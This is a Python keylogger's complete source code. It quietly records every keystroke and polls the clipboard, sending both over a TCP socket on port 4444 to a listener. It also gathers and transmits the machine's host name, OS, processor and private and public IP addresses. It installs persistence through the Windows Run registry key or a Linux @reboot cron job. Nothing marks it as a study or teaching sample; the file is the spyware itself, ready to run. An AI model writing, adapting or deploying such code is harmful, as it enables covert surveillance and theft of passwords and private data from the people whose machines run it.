import socket
from pynput.keyboard import Key, Listener
import pyperclip
import threading
import time
import os, sys
import platform
import requests

SERVER = '0.0.0.0'
port = 4444
address = (SERVER, port)

count = 0
keys = []
file = open('keylogger.txt', 'a')
def connect_client():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(address)
        return client
    except:
        print("Error")

client = connect_client()

def send_data(data):
    try:
        client.sendall(data.encode())
    except:
        client.close()
        connect_client()

# Auto-start: Determine OS and set auto-start accordingly.
def set_autostart():
    if sys.platform.startswith('win'):
        # Windows auto-start using Registry
        try:
            import winreg as reg
            exe_path = os.path.abspath(sys.argv[0])
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "MyKeylogger", 0, reg.REG_SZ, exe_path)
            key.Close()
            send_data("[*] Auto-start registry entry added for Windows. \n")
        except Exception as e:
            send_data(f"[!] Auto-start failed on Windows: {e}")
    elif sys.platform.startswith('linux'):
        # Linux auto-start using cron job
        try:
            exe_path = os.path.abspath(sys.argv[0])
            cron_job = f"@reboot python3 {exe_path} &\n"
            cron_file = os.path.expanduser("~/.cron_keylogger")
            with open(cron_file, "a") as f:
                f.write(cron_job)
            os.system(f"crontab {cron_file}")
            send_data("[*] Auto-start cron job added for Linux. \n")
        except Exception as e:
            send_data(f"[!] Auto-start failed on Linux: {e}\n")

# Call auto-start function at launch
set_autostart()

#Getting the Information of the computer

def computer_information():
    send_data("")
    send_data("COMPUTER'S INFORMATION\n")
    hostname = socket.gethostname()
    IP_address  = socket.gethostbyname(hostname)
    try:
        public_address = requests.get('https://api.ipify.org').text
        send_data(f"Public IP_Address: {public_address}")
    except Exception:
        send_data('Public IP: Could not get the Public Address')
    host = "Host Name: " + hostname
    send_data(f"{host} \n" )
    processor = " Processor : " + platform.processor()
    send_data(f"{processor}\n")
    system_infor = "System : " + platform.system() + platform.version()
    send_data(f"{system_infor}\n")
    machine = "Machine: " + platform.machine()
    send_data(f"{machine} \n")
    send_data(f"Private IP_ADDRESS: {IP_address}\n")

computer_information()


def on_write(key):
    global keys, count
    # print(key)

    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_key_file(keys)
        keys = []

def write_key_file(keys):
    for key in keys:
        k = str(key).replace("'", "")
        if "Key.space" == k:
            send_data(" ")
        elif "Key.enter" == k:
            send_data("\n")
        elif "Key" not in k:
            send_data(k)

def clip_board():
    try:
        last_copied = ''
        while True:
            current_copied = pyperclip.paste()
            if current_copied != last_copied:
                send_data(f"[Clipboard]:{current_copied}")
                last_copied = current_copied
            time.sleep(2)
    except Exception as e:
        print(f"{e}")

def on_release(key):
    if key == Key.esc:
        return False

clipboard_thread = threading.Thread(target=clip_board, daemon=True)
clipboard_thread.start()
    
with Listener(on_press=on_write, on_release=on_release) as listener:
    listener.join()